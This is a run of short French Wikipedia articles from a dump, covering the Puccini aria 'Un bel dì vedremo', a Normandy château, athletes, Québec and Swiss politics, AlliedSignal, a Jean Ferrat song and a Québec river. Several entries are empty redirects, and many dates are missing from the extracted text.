C'est un air-récit inhabituel, puisqu'il ne raconte pas le passé mais se projette dans le désir du personnage récitant et constitue une vision éveillée d'un futur possible, avec une scène suggérée par le texte dans ses moindres détails. D'un point de vue dramaturgique, l'air constitue le point culminant d'une scène où Butterfly essaie de convaincre Suzuki et elle-même que son mari, parti trois ans plus tôt dans son pays, finira par revenir. C'est une véritable déclaration de foi, précédée par « "" » (ah, la foi te manque ! Écoute). 
La didascalie précise, juste après ce « Senti » : (elle mime la scène comme si elle y assistait réellement). Le mot « foi » revient qui plus est dans le dernier vers pour conclure l'aria. Les vers de Luigi Illica (texte) et Giuseppe Giacosa (versification) ne présentent pas la structure régulière d'une aria. Elle est composée de vers à 11 syllabes ("endecasillabi"), de vers à 7 "settenari" ou à 5 "quinari", librement alternés, et en partie liés à la rime. Lors de la création en français à l'Opéra-Comique, fin 1906, l'air deviendra « Sur la mer calmée, au loin une fumée... ». 
C'est aussi un des plus longs airs de Puccini (près de 5 minutes) et à la fin, l'orchestre reprend le thème initial, sans doute pour décourager les applaudissements et les rappels, la plupart du temps en vain. En effet, le rêve éveillé de Butterfly, considéré comme , comme une vision lointaine "pianissimo", presque murmuré, finit par éclater "con forza", comme un cri du cœur qui frôle la folie.
Vers.
[Senti.] Un bel dì, vedremo 
levarsi un fil di fumo sull'estremo 
confin del mare. 
E poi la nave appare 
Poi la nave bianca. 
Entra nel porto, romba il suo saluto. 
Vedi ? È venuto ! 
Io non gli scendo incontro, io no. Mi metto 
là sul ciglio del colle e aspetto, e aspetto 
gran tempo e non mi pesa 
la lunga attesa. 
E... uscito dalla folla cittadina 
un uomo, un picciol' punto 
s'avvia per la collina. 
Chi sarà ? Chi sarà ? 
E come sarà giunto 
che dirà ? che dirà ? 
Chiamerà Butterfly dalla lontana. 
Io senza dar risposta 
me ne starò nascosta 
un po' per celia... un po' per non morire 
al primo incontro, ed egli alquanto in pena 
chiamerà, chiamerà: 
« "Piccina – mogliettina" 
"olezzo di verbena" » 
i nomi che mi dava al suo venire. 
"(a Suzuki)" 
Tutto questo avverrà, te lo prometto. 
Tienti la tua paura. – io con sicura 
fede lo aspetto.
Interprètes.
L'air est créé le par la Storchio, dans ce qui restera comme le plus mémorable fiasco de la Scala de Milan. L'opéra est alors déprogrammé et révisé pour être redonné le de la même année au Teatro Grande de Brescia par la soprano Solomiya Krushelnytska. Il est ensuite chanté au Covent Garden par Emmy Destinn puis au Metropolitan Opera House par Geraldine Farrar. Parmi les sopranos les plus célèbres, il a été notamment chanté par Renata Tebaldi, Renata Scotto et Maria Callas.

</doc>
<doc id="10576849" url="https://fr.wikipedia.org/wiki?curid=10576849" title="Un bel dì vedremo">
Un bel dì vedremo



</doc>
<doc id="10576852" url="https://fr.wikipedia.org/wiki?curid=10576852" title="Château du Mont-à-la-Vigne">
Château du Mont-à-la-Vigne

Le château du Mont-à-la-Vigne est une demeure des qui se dresse sur le territoire de l'ancienne commune française de Monteille, dans le département du Calvados, en région Normandie. L'édifice est inscrit au titre des monuments historiques.
Localisation.
Le château se situe sur une éminence dans la vallée de la Vie, au-dessus du village de Monteille, au sein de la commune nouvelle de Mézidon Vallée d'Auge, dans le département français du Calvados.
Historique.
Les campagnes principales de construction du château datent du , puis des .
L’édifice a joué un rôle notable dans la région au moment des guerres de Religion du .
L’édifice est indiqué appartenir à la famille de Tesson par Arcisse de Caumont. En 1778, il appartient au comte de Tesson de la Viéville, seigneur de Monteille et autres lieux.
Description.
Arcisse de Caumont (1801-1873) indique que les bâtiments s’organisent autour d’une cour, avec des tourelles et des fossés.
Le même auteur date les bâtiments du et du .
Il subsiste un corps de logis des en pierre et pans de bois, ceint d'une enceinte flanquée de quatre tours.
Protection.
L'ancien château est inscrit au titre des monuments historiques par arrêté du .

</doc>
<doc id="10576857" url="https://fr.wikipedia.org/wiki?curid=10576857" title="Ibrahim Dossey">
Ibrahim Dossey

Ibrahim Dossey est un footballeur ghanéen né le à Accra et mort le à Bucarest. Il évoluait au poste de gardien de but.
Biographie.
En club.
Ibrahim Dossey joue en Roumanie durant toute sa carrière. Il dispute un match en Ligue des champions et quatre en Coupe de l'UEFA.
Le , deux jours après sa signature au FC Municipal Târgovişte, il a un accident de voiture le laissant dans le coma. Il meurt des suites de cet accident le .
En équipe nationale.
Il est médaillé de bronze avec le Ghana lors des Jeux olympiques d'été de 1992. Il dispute la petite finale contre l'Australie lors du tournoi olympique.
Palmarès.
"Avec le Ghana :"

</doc>
<doc id="10576859" url="https://fr.wikipedia.org/wiki?curid=10576859" title="Organiste du Magdalena">
Organiste du Magdalena

L'Organiste du Magdalena (Euphonia concinna) est une espèce de passereau de la famille des Fringillidae endémique de Colombie.

</doc>
<doc id="10576864" url="https://fr.wikipedia.org/wiki?curid=10576864" title="Un bel di vedremo">
Un bel di vedremo



</doc>
<doc id="10576873" url="https://fr.wikipedia.org/wiki?curid=10576873" title="Souvenirs de Futurs">
Souvenirs de Futurs



</doc>
<doc id="10576875" url="https://fr.wikipedia.org/wiki?curid=10576875" title="12 Heures de Sebring 1957">
12 Heures de Sebring 1957

Les 12 Heures de Sebring 1957 sont la de l'épreuve et la du championnat du monde des voitures de sport 1957. Elles ont été remportées le par la Maserati 450S de la Maserati Factory pilotée par Jean Behra et Juan Manuel Fangio.
Circuit.
Les 12 Heures de Sebring 1957 se déroulent sur le Sebring International Raceway situé en Floride. Il est composé de deux longues lignes droites, séparées par des courbes rapides ainsi que quelques chicanes. Le tracé actuel diffère de celui de l'époque. Ce tracé a un grand passé historique car il est utilisé pour des courses automobiles depuis 1950. Ce circuit est célèbre car il a accueilli la Formule 1.
Résultats.
Voici le classement au terme de la course.

</doc>
<doc id="10576877" url="https://fr.wikipedia.org/wiki?curid=10576877" title="Poulet Frit Kentucky">
Poulet Frit Kentucky



</doc>
<doc id="10576879" url="https://fr.wikipedia.org/wiki?curid=10576879" title="Directrice marketing">
Directrice marketing



</doc>
<doc id="10576891" url="https://fr.wikipedia.org/wiki?curid=10576891" title="Live in Berlin (album de Ludivico Einaudi)">
Live in Berlin (album de Ludivico Einaudi)

 est un enregistrement en public en 2 CD du pianiste et compositeur italien Ludovico Einaudi de .
Album live pour piano et cordes.
Enregistrement de la tournée allemande pour l'album "Divenire" à Berlin, au "Berliner Philharmonie Kammermusiksaal" en .
Pour piano et ensemble de 6 instruments à cordes (violoncelle, contrebasse, 2 altos et 2 violons), musique électronique (loops, mix) et percussions.
Les titres proviennent des albums : "Divenire" (: 1 à 9 ; : 4), "I giorni" (: 1, 5), "Le onde" (: 2) et "Eden Roc" (: 3). Ces derniers sont des arrangements pour piano et cordes des versions originales.
Pistes.
CD 1
CD 2

</doc>
<doc id="10576899" url="https://fr.wikipedia.org/wiki?curid=10576899" title="Les Espions d'à côté">
Les Espions d'à côté

Les Espions d'à côté, ou Nos voisins les Jones au Québec ("Keeping Up with the Joneses") est un film américain réalisé par Greg Mottola, sorti en 2016.
Synopsis.
Jeff Gafney travaille aux RH de la société MBI. Lui et son épouse vivent une vie paisible dans leur pavillon de banlieue, lorsque le couple Jones vient emménager dans la maison d'â côté. Très vite, le couple Gafney éprouve des doutes sur l'identité et l'activité réelle des Jones.

</doc>
<doc id="10576918" url="https://fr.wikipedia.org/wiki?curid=10576918" title="Branko Miljus">
Branko Miljus



</doc>
<doc id="10576921" url="https://fr.wikipedia.org/wiki?curid=10576921" title="Diana Soviero">
Diana Soviero

Diana Soviero (née le à Jersey City) est une chanteuse lyrique américaine, soprano.
Après avoir étudié a la Juilliard School, elle débute en 1969 sous le nom de Diana Catani-Soviero au dans le rôle de Mimì de "La Bohème".
Elle fait ses débuts au New York City Opera en 1973, au Lyric Opera de Chicago en 1979, au San Francisco Opera en 1982, notamment dans les opéras véristes dans des rôles comme ceux de "Nedda", "Manon Lescaut", "Madame Butterfly".
Discographie.
- Récital, Airs véristes, Dir. Joseph Rescigno

</doc>
<doc id="10576936" url="https://fr.wikipedia.org/wiki?curid=10576936" title="Chardine Sloof">
Chardine Sloof

Chardine Sloof est une biathlète néerlandaise naturalisée suédoise, née le à Waddinxveen.
Biographie.
Chardine Sloof qui a commencé le biathlon à l'âge de onze ans, dispute sa première compétition internationale en fin d'année 2007. Ses frères Luciën et Joël sont aussi biathlètes.
Elle découvre la Coupe du monde en janvier 2011 à Ruhpolding.
En 2012, elle devient double championne du monde junior à Kontiolahti de l'individuel et la poursuite (20/20 au tir), pour apporter à son pays ses premiers titres internationaux en biathlon puis participe pour la première fois aux Championnats du monde élite disputés à Ruhpolding.
En 2015, elle cesse de représenter les Pays-Bas et opte pour l'équipe nationale de Suède, pays dans lequel elle réside depuis plus de quinze ans, mais garde cependant sa nationalité néerlandaise.
Lors de la saison 2016-2017, elle marque ses premiers points en Coupe du monde lors de l'étape d'Oberfof où elle se classe du sprint, de la poursuite et de la mass-start.
Handicapée par une mononucléose lors des saisons suivantes, elle apparait seulement en IBU Cup tout au long de l'année 2019, montant sur le podium à Arber en janvier. Elle prend sa retraite sportive en 2020.
Palmarès.
Coupe du monde.
Classements en Coupe du monde.
Représentant les Pays-Bas :
Représentant la Suède :

</doc>
<doc id="10576937" url="https://fr.wikipedia.org/wiki?curid=10576937" title="Région statistique et de planification (Hongrie)">
Région statistique et de planification (Hongrie)



</doc>
<doc id="10576938" url="https://fr.wikipedia.org/wiki?curid=10576938" title="Super-région statistique (Hongrie)">
Super-région statistique (Hongrie)



</doc>
<doc id="10576940" url="https://fr.wikipedia.org/wiki?curid=10576940" title="Course à la direction du Parti québécois de 1996">
Course à la direction du Parti québécois de 1996

La course à la direction du Parti québécois de 1996 a pour but d'élire le chef du Parti québécois à la suite de l'annonce de la démission de Jacques Parizeau, le .
Seul candidat annoncé, Lucien Bouchard est élu par acclamation le à Montréal.
Contexte.
À la suite de la défaite des indépendantistes lors du référendum du 30 octobre 1995, le chef du parti, Jacques Parizeau, annonce qu'il laissera sa place dès qu'on lui aura trouvé un successeur. Puisque le Parti québécois forme alors le gouvernement, le prochain chef sera appelé à devenir par le fait même premier ministre du Québec.
Durant la campagne référendaire, Lucien Bouchard, alors chef du Bloc québécois et chef de l'opposition officielle du Canada, avait fait bonne impression. Les candidats potentiels à la direction du parti affirment qu'ils se rangeront derrière lui s'il décide de poser sa candidature. Il démissionne de ses fonctions fédérales le et il est élu chef par acclamation le 27 janvier.

</doc>
<doc id="10576942" url="https://fr.wikipedia.org/wiki?curid=10576942" title="Raimond V">
Raimond V



</doc>
<doc id="10576946" url="https://fr.wikipedia.org/wiki?curid=10576946" title="Sergueï Viatcheslavovitch Saveliev">
Sergueï Viatcheslavovitch Saveliev

Sergueï Viatcheslavovitch Saveliev (en ; né le à Moscou en Union soviétique) est un scientifique russe, évolutionniste, paleoneurologue, docteur en sciences biologiques, professeur, chef du laboratoire du système nerveux de l'Institut de la morphologie humaine de l'Académie des sciences de Russie, auteur de l'idée de tri cérébral.
Biographie.
Il est né à Moscou, diplômé de la Faculté de biologie et de chimie du MGZPI (maintenant l'Université des sciences humaines de Moscou), a travaillé à l'Institut du cerveau de l'Académie des sciences médicales de l'URSS, depuis 1984 à l'Institut de la morphologie humaine de l'Académie russe des sciences médicales. Le photographe, qui a été récompensé par une médaille de bronze, d'argent et d'or de l'Union créatrice des artistes de la Russie. L'auteur de l'idée de tri cérébral.
Activités scientifiques.
Depuis plus de 30 ans, Sergueï Saveliev mène des recherches dans le domaine de la morphologie et de l'évolution du cerveau. L'auteur de plus de 10 livres, 100 articles scientifiques et le premier Atlas stéréoscopique du cerveau humain, qui a reçu le prix de V.N. Chevkunenko de l'Académie russe des sciences médicales pour les meilleurs travaux scientifiques sur "Anatomie topographique et chirurgie opératoire" pour 2001.
Pendant de nombreuses années il a été engagés dans l'étude des pathologies fœtales du système nerveux et le développement de méthodes de diagnostic.
Il a découvert les principes clés de l'apparition des anomalies de neurulation du développement du système nerveux de l'homme et les animaux.
Pour la première fois, il a examiné et photographié l'embryon humain de 11 jours.
Il établit avec précision aux jours les phases d'urgence dans la formation du système nerveux de l'embryon, conduisant à différentes pathologies du cerveau humain.
Il a étudié les mécanismes moléculaires de codage de l'information morphogénétique dans le système nerveux embryonnaire.
Il a créé et confirmé expérimentalement la théorie positionnelle du contrôle du développement embryonnaire précoce du cerveau des vertébrés, prouvant que dans les premiers stades de développement, il n'y a pas de détermination rigide génétique (le destin cellulaire est déterminée non par le génome, mais par interactions biomécaniques intercellulaires).
En 2002, il a publié une monographie, illustrée avec des images originales d'embryons humains entiers dans les premiers jours après l'implantation et la période de neurulation.
Il accorde une attention particulière à l'origine du système nerveux et de son évolution, introduit la théorie évolutionnaire des environnements transitoires comme une base pour le développement de modèles neurobiologiques de l'origine des chordés, protoaquatic vertébrés, les amphibiens, les reptiles, les oiseaux et les mammifères, a donné des exemples de l'utilisation des lois neurobiologiques pour la reconstruction des chemins d'évolution des vertébrés et des invertébrés.
Il a développé les principes de base de l'évolution adaptative du système nerveux et du comportement.
Il a étudié les raisons et les régularités évolutives du développement du cerveau antérieur et du néocortex des mammifères.
Il a décrit les caractéristiques morphologiques et fonctionnelles de l'évolution précoce du cerveau des primates.
À partir de l'analyse de la structure du cerveau des hominidés, il a développé des hypothèses neurobiologiques de l'origine de la bipédie, du développement des centres de l'association et de la parole, établi des régularités neurobiologiques d'origine du cerveau de l'humain moderne.
Pendant de nombreuses années il est engagé dans la recherche dans le domaine de la paléoneurologie avec l'Institut de paléontologie de l'Académie des sciences de Russie.
En collaboration avec des scientifiques de l'Institut A.V. Lavrov (laboratoire de mammifères) et V.R. Alifanov (laboratoire de paléoherpépologie), il a établi les principes de l'organisation du cerveau des dinosaures, creodontes et gienodontes.
Il a développé une hypothèse de l'origine des protoplumes à partir des appendices cutanés (d'écailles sétigeres) des dinosaures du Jurassique supérieur.
En 2009, il a développé une méthode pour identifier les signes cachés de la schizophrénie basée sur la présence ou l'absence de pierres et de cavités vides dans l'épiphyse.
En 2013, il a dirigé le groupe de travail pour étudier le cerveau d'un mammouth, qui comprenait des employés de l'Institut de recherche de morphologie humaine de l'Académie russe des sciences médicales, l'Académie des sciences de Yakutsk et l'Institut de paléontologie de l'Académie russe des sciences.
Sous sa direction en 2014 a été créé le premier modèle tridimensionnel du cerveau d'un mammouth.
En 2014, il a dirigé l'expérience "Gecko-F4", dont le but était d'étudier l'effet de la microgravité sur le comportement sexuel, le corps des animaux adultes et le développement embryonnaire des geckos Phelsuma ornata dans deux mois l'expérience orbitale sur le satellite de recherche russe "Foton-M №4".
Sergueï Saveliev est l'auteur de l'idée de tri cérébrale - une méthode d'analyse des capacités humaines individuelles sur les structures du cerveau à travers le développement et l'application d'une tomographe haute résolution.
L'idée est basée sur ses nombreuses années d'expérience dans l'étude de la cytoarchitectonique du cortex cérébral, ainsi que des études sur la variabilité individuelle de l'architectonique et des structures cérébrales sous-corticales et la recherche des bases morphologiques des talents humains, tenue à l'Institut du cerveau de l'Académie des sciences médicales de l'URSS.

</doc>
<doc id="10576952" url="https://fr.wikipedia.org/wiki?curid=10576952" title="Course à la direction du Parti québécois de 1988">
Course à la direction du Parti québécois de 1988

La course à la direction du Parti québécois de 1988 a pour but d'élire le chef du Parti québécois à la suite de la démission de Pierre Marc Johnson, le .
Seul candidat annoncé, Jacques Parizeau est élu par acclamation le .
Contexte.
Lorsque Pierre Marc Johnson prend la relève du fondateur René Lévesque à la tête du parti, il propose de mettre de côté l'idéologie indépendantiste au profit de l'« affirmation nationale ». Son message ne réussit pas à convaincre une partie des militants et il préfère laisser sa place en démissionnant. Jacques Parizeau, ministre des Finances sous René Lévesque, est pressenti pour prendre sa relève. Il est effectivement élu par acclamation en mars 1988.

</doc>
<doc id="10576959" url="https://fr.wikipedia.org/wiki?curid=10576959" title="Élections sénatoriales de 2017 dans les Landes">
Élections sénatoriales de 2017 dans les Landes

Les élections sénatoriales dans les Landes ont lieu le dimanche . Elles ont pour but d'élire les sénateurs représentant le département au Sénat pour un mandat de six ans.
Contexte départemental.
Lors des élections sénatoriales de 2011 dans les Landes, deux sénateurs PS ont été élus : Jean-Louis Carrère et Danielle Michel.
Depuis, tous les effectifs du collège électoral des grands électeurs ont été renouvelés, avec les élections législatives de 2017, les élections régionales de 2015, les élections départementales de 2015 et les élections municipales de 2014.
Présentation des candidats et des suppléants.
Les nouveaux représentants sont élus pour une législature de 6 ans au suffrage universel indirect par les grands électeurs du département. Dans les Landes, les sénateurs sont élus au scrutin majoritaire à deux tours. Leur nombre reste inchangé, deux sénateurs sont à élire. Il y aura plusieurs candidats dans le département, chacun avec un suppléant.

</doc>
<doc id="10576991" url="https://fr.wikipedia.org/wiki?curid=10576991" title="Anna Magnusson">
Anna Magnusson

Anna Evelina Magnusson, née le à Piteå, est une biathlète suédoise.
Carrière.
Représentant d'abord le club Hemmingsmarks IF en ski de fond, puis celui de Piteå, 
où elle s'entraîne avec la future star suédoise Hanna Öberg. Comme cette dernière, elle a étudié à l'école de biathlon de Sollefteå et disputé sa première compétition internationale en 2013 au Festival olympique de la jeunesse européenne.
Deux mois après avoir intégré le relais suédois féminin en Coupe du monde, elle dispute enfin sa première course individuelle, un individuel, lors des Championnats du monde 2015 où elle signe notamment une huitième place avec le relais.
Elle marque son premier point en Coupe du monde en fin d'année 2015 à Östersund en se classant de l'individuel. En 2016, Magnusson remporte deux médailles aux Championnats du monde junior à Cheile Gradistei, l'argent sur le relais et le bronze sur le sprint.
Elle obtient ses meilleurs résultats individuels au cours de l'hiver 2016-2017, collectant deux "top dix", dont une septième place à la mass start d'Antholz. 
Elle monte sur son premier podium en Coupe du monde avec le relais en à Oberhof.
Aux Jeux olympiques d'hiver de 2018, elle se classe de l'individuel avant de remporter la médaille d'argent du relais avec Linn Persson, Mona Brorsson et Hanna Öberg. Un an plus tard, aux Championnats du monde 2019, elle est à nouveau médaillée d'argent avec le relais et se classe notamment de la poursuite, remontant depuis la position au départ.
Aux Jeux olympiques de 2022, remplaçante au sein d'une équipe suédoise où la concurrence est très forte, elle est sélectionnée pour disputer le sprint et confirme la confiance accordée par les entraîneurs : elle égale la meilleure performance de sa carrière jusque là en terminant septième.
Titulaire dans l'équipe première suédoise dès le début de la saison 2022-2023 de Coupe du monde, elle remporte notamment avec ses coéquipières le premier relais à Kontiolahti. Elle confirme son excellente forme du moment en remportant sa première victoire individuelle en Coupe du monde au Grand Bornand le 16 décembre : elle gagne le sprint devant sa compatriote Linn Persson grâce à un sans faute au tir et un belle prestation sur les skis (meilleur temps du dernier tour de piste). Après avoir obtenu la médaille de bronze du relais avec Linn Persson et les sœurs Öberg aux championnats du monde en février 2023, elle signe son second podium individuel lors de l'étape finale à Holmenkollen en mars en se classant troisième du sprint. Elle boucle cette saison 2022-2023, la meilleure de sa carrière, au rang du classement général de la Coupe du monde.
Elle attaque la saison 2025-2026 de la meilleure des manières, avec trois podiums sur les quatre premières couses individuelles. Elle s'empare ainsi du dossard jaune pour la première fois de sa carrière.
Vie privée.
Elle est la petite-amie du biathlète Peppe Femling.

</doc>
<doc id="10577000" url="https://fr.wikipedia.org/wiki?curid=10577000" title="AlliedSignal">
AlliedSignal

AlliedSignal était une compagnie américaine aérospatiale, automobile et d'ingénierie, créée par la réunion en 1985 d’Allied Corporation et de Signal Companies. Elle acheta ensuite "Honeywell International Inc." pour de dollars, en 1999, puis adopta le nom de cette entreprise.
Histoire.
L’"Allied Chemical &amp; Dye Corporation" naquit de la fusion, en 1920, de cinq compagnies chimiques : "Barrett Chemical Company", "General Chemical Company", ', "Semet-Solvay Company" et la ', avec l'appui du chimiste William Nichols, qui devenait inquiet de la dépendance américaine à propos de l'industrie chimique allemande au cours de la Première Guerre mondiale, et du financier Eugene Meyer. Cette compagnie prit également possession de l’"Eltra Corporation" en 1979.
La compagnie changea de nom une première fois en 1958, devenant "Allied Chemical Corporation", puis devint tout simplement "Allied Corp." en 1981. "Allied" fusionna avec la " en 1983, point de départ pour son implication dans l'aérospatiale.
La "Signal Companies" possédait une histoire qui remontait à la "Signal Gasoline Company", fondée par Samuel B. Mosher en 1922. Elle changea de nom pour "Signal Gas &amp; Oil" en 1928, afin de refléter son marché en expansion. Pendant les années 1950, "Signal" était la plus importante compagnie pétrolière de la côte ouest des États-Unis, et Mosher avait de grands enjeux dans les "American President Lines" et la "Flying Tiger Line". En 1964, "Signal" fusionna avec la "Garrett Corporation", une compagnie aérospatiale, et la nouvelle compagnie formée adopta « "The Signal Companies" » comme nom définitif en 1968.
La fusion d’"Allied" et de "Signal" fit de l'aérospatiale le nouveau plus gros secteur de marché de la compagnie. Elle adopta le nom d’"Allied-Signal" le . Le tiret fut abandonné à l'occasion d'un ultime renommage, en 1993, devenant "AlliedSignal", afin de renforcer l'image d'une compagnie unie et démonter l'intégration de toutes ses affaires. En 1999, "AlliedSignal" acheta "Honeywell" et choisit de prendre son nom, qui était plus reconnaissable.
Gamme de produits.
En 2006, ses produits automobiles incluaient les filtres , les bougies d'allumage "" et le liquide antigel "Prestone".La "Bendix Corporation" avait acheté Fram et Autolite à d'autres compagnies en 1973. La marque "Prestone" fut achetée à la fin des années 1990.
Honeywell, avant la fusion, était une compagnie internationale qui développait et fournissait des produits de technologie avancée, des systèmes et services à l'aviation, l'espace et au industries. Les lignes de production des deux compagnies furent complémentaires, le seul chevauchement étant situé au niveau de l'avionique.

</doc>
<doc id="10577003" url="https://fr.wikipedia.org/wiki?curid=10577003" title="Stephanie Baumann">
Stephanie Baumann

Stephanie Baumann, née le à Berne (originaire de Wileroltigen), est une personnalité politique suisse, membre du parti socialiste et conseillère nationale pour le canton de Berne de 1994 à 2003.
Biographie.
Stephanie Baumann naît le à Berne. Elle est originaire de Wileroltigen, dans le même canton. 
Elle a fréquenté une école de commerce puis l'École des arts appliqués de Berne. 
Elle est mariée à Ruedi Baumann, également actif en politique et membre des Verts. 
Parcours politique.
En 1986, Stephanie Baumann est élue au Grand Conseil du canton de Berne. 
En , elle accède au Conseil national à la suite de la nomination de Gret Haller au poste d'ambassadeur permanent de la Suisse auprès du Conseil de l'Europe. Elle est réélue lors des élections fédérales de 1995 et 1999. De 1995 à 2003, elle est membre de la commission de la sécurité sociale et de la santé publique.
Stephanie Baumann a été présidente du conseil d'administration de l'Hôpital de l'Île de Berne.

</doc>
<doc id="10577023" url="https://fr.wikipedia.org/wiki?curid=10577023" title="Nouveau théâtre de Łódź">
Nouveau théâtre de Łódź

Le Nouveau théâtre Kazimierz Dejmek de Łódź (en ) est une salle de spectacle située à Łódź en Pologne. Le théâtre est inauguré le avec l'adaptation de la "Brygada szlifierza Karhana" de , une œuvre de réalisme socialiste soviétique. Le noyau de la troupe à l'époque est composé de jeunes élèves de l'école de théâtre de Łódź Leon Schiller comme Kazimierz Dejmek, Dobrosław Mater, Tadeusz Mierzejewski, Janusz Warminski, Jerzy Merunowicz, Stanislaw Lapinski, Barbara Rachwalska, Bronislaw Bronowska Joseph Pilarski, Wojciech Pilarski, Tadeusz Minc, Joseph Łodyński, Janusz Kłosiński et Andrew Wydrzyński. Initialement le théâtre est installé au 34, rue Daszyńskiego, puis en 1951 déménage au numéro 93, rue Zachodnia (Petite salle). Il dispose également de Grande salle au numéro 15, rue Więckowskiego. Depuis 2016, il porte le nom de son premier directeur .

</doc>
<doc id="10577024" url="https://fr.wikipedia.org/wiki?curid=10577024" title="Généalogie de Gosuin van Goetsenhoven aux XIIIe et XIVe siècles">
Généalogie de Gosuin van Goetsenhoven aux XIIIe et XIVe siècles



</doc>
<doc id="10577036" url="https://fr.wikipedia.org/wiki?curid=10577036" title="Pauvre Boris">
Pauvre Boris

Pauvre Boris est une chanson de l'auteur-compositeur-interprète Jean Ferrat, parue en 1967, sur l'album "Maria" (dont elle est le dixième et dernier titre).
Jean Ferrat l’enregistre, à Paris, dans la période du 27 au , au studio Barclay. La chanson est un hommage à Boris Vian auteur du titre "Le Déserteur" particulièrement évoqué par Jean Ferrat.
Histoire.
 Tu vois rien n’a vraiment changé 
Depuis que tu nous as quittés
Jean Ferrat termine chacun des couplets de sa chanson par , ce réputé pessimiste. Boris Vian fut lui-même très controversé à son époque. Auteur de la chanson "Le déserteur", doté d’un texte profondément anti-militariste et sorti en (à la fin de la guerre d’Indochine - 1946 / 1954 - et avant la guerre d’Algérie - 1954 / 1962), et immédiatement censuré...
Ferrat évoque cette censure et raille le fait qu'alors, en 1966, le chanteur Richard Anthony connait un grand succès avec la reprise de la chanson de Vian : 
 L’autre jour on a bien ri
Il paraît que « Le déserteur » 
Est un des grands succès de l’heure 
Quand c’est chanté par Anthony
Voilà quinze ans qu’en Indochine
La France se déshonorait
Et l’on te traitait de vermine
De dire que tu n’irais jamais
Si tu les vois sur leurs guitares
Ajuster tes petits couplets
Avec quinze ans de retard
Ce que tu dois en rigoler
Pauvre Boris
Jean Ferrat rappelle que l’artiste fut un incompris de son vivant.

</doc>
<doc id="10577039" url="https://fr.wikipedia.org/wiki?curid=10577039" title="2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-heptadécaméthylnonadécane">
2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-heptadécaméthylnonadécane



</doc>
<doc id="10577048" url="https://fr.wikipedia.org/wiki?curid=10577048" title="Batista (football, 1961)">
Batista (football, 1961)

João Batista Viana dos Santos, plus communément appelé Batista, est un footballeur brésilien né le à Uberlândia. Il évoluait au poste de défenseur.
Biographie.
En club.
Batista joue au Brésil dans des clubs comme l'Atlético Mineiro ou l'Atlético Paranaense, ainsi qu'au FC Tirsense au Portugal.
En équipe nationale.
Il est médaillé d'argent avec le Brésil lors des Jeux olympiques d'été de 1988. Il dispute deux matchs lors du tournoi olympique.
International, il reçoit 7 sélections pour 1 but marqué en équipe du Brésil entre 1987 et 1989.
Palmarès.
"Avec l'Atlético Mineiro :"
"Avec le Brésil :"

</doc>
<doc id="10577049" url="https://fr.wikipedia.org/wiki?curid=10577049" title="João Batista Viana Santos">
João Batista Viana Santos



</doc>
<doc id="10577055" url="https://fr.wikipedia.org/wiki?curid=10577055" title="Mauro Geraldo Galvão">
Mauro Geraldo Galvão



</doc>
<doc id="10577073" url="https://fr.wikipedia.org/wiki?curid=10577073" title="Première Guerre judéo-romaine">
Première Guerre judéo-romaine



</doc>
<doc id="10577075" url="https://fr.wikipedia.org/wiki?curid=10577075" title="Première Guerre crétoise">
Première Guerre crétoise



</doc>
<doc id="10577084" url="https://fr.wikipedia.org/wiki?curid=10577084" title="Reynold Tschäppät">
Reynold Tschäppät

Reynold Tschäppät, né le à Malleray et mort le à Berne, est une personnalité politique suisse, membre du parti socialiste.
Biographie.
Reynold Tschäppät est issu d'une famille modeste tributaire de l’aide aux pauvres. Son père, Henri, sympathisant socialiste et employé de la poste ferroviaire, est licencié pour sa participation à la grève générale de 1918.
Reynold Tschäppät a étudié le droit et obtenu son diplôme à l'Université de Berne. Il a travaillé en 1943 comme employé au tribunal de Moutier, puis comme collaborateur (dès 1944), et enfin vice-directeur de la Division des réfugiés du Département fédéral de justice et police sous . Depuis 1946, il était marié à Lilly née Bürki avec qui il a eu trois fils: Reynold, Alexander (ancien président de la ville de Berne) et Philipp.
Reynold Tschäppät a été élu au conseil municipal de Berne (1948-1960) puis trois ans plus tard au Grand Conseil du canton de Berne (1951-1963) pour le parti socialiste. En 1960, il entre à l'exécutif de la ville de Berne puis au Conseil national (1963). Il conservera ces deux mandats jusqu'à sa mort. 
En 1966, après un scrutin très disputé, il est élu à la présidence de la ville de Berne en obtenant 12 808 voix contre 12 429 voix pour le candidat du parti radical . En 1979, Tschäppät pose sa candidature au Conseil des États, mais tombe malade peu après et meurt le . Il a été enterré au cimetière de Bremgarten (BE). 
Le populaire a dit : « Pour moi, Berne est la plus belle ville du monde. Je sais que chaque maire le dit de sa ville. La seule différence est la suivante: Berne, l'est ! »

</doc>
<doc id="10577086" url="https://fr.wikipedia.org/wiki?curid=10577086" title="Seconde Guerre séminole">
Seconde Guerre séminole



</doc>
<doc id="10577092" url="https://fr.wikipedia.org/wiki?curid=10577092" title="Troisième Guerre séminole">
Troisième Guerre séminole



</doc>
<doc id="10577094" url="https://fr.wikipedia.org/wiki?curid=10577094" title="Rivière du Bras Coupé">
Rivière du Bras Coupé

La rivière du Bras Coupé est un affluent de la rivière Désert, coulant au nord de la rivière des Outaouais, dans le canton de Lytton, dans la municipalité de Montcerf-Lytton, dans la municipalité régionale de comté (MRC) de La Vallée-de-la-Gatineau, dans la région administrative de la Outaouais, au Québec, au Canada.
Ce cours d’eau coule entièrement dans une petite vallée en zone forestière. Cette zone est sans construction humaine.
La surface de la rivière du Bras Coupé est généralement gelée de la mi-décembre jusqu’à la fin mars. La foresterie constitue la principale activité économique.
Géographie.
La rivière du Bras Coupé prend sa source dans le canton de Lytton, à l’embouchure d’un lac du Bras Coupé (longueur : en forme de U ouvert vers le nord-est ; altitude : ), dans la municipalité de Montcerf-Lytton. Le lac Pontiac constituant la tête de la rivière Pierreuse est situé au centre du lac du Bras Coupé en forme de U. Le sommet Sud-Est du U se prolonge par les lacs Laird (altitude : ) et Blanc (altitude : ). Le fond du U recueille les eaux de la décharge des lacs du Camp et Whitelaw, ainsi que la décharge du lac Mulligan et du Butor. Le sommet Nord-Ouest du U est rattaché à la Baie Demarest, formé en parallèle à cette branche du U.
Le lac du Bras Coupé chevauche les cantons du Maine (Nord-Ouest), de Lytton (Nord-Est), d’Angoumois (Sud-Ouest) et d’Égan (Sud-Est). L’embouchure de ce lac est située à au nord-ouest du centre-ville de Maniwaki, à au nord de la confluence de la rivière Gatineau et à au nord-ouest de la confluence de la rivière du Bras Coupé.
À partir de l’embouchure du lac du Bras Coupé (correspondant à la limite des cantons de Maine et de Lytton), la rivière du même nom coule sur , selon les segments suivants :
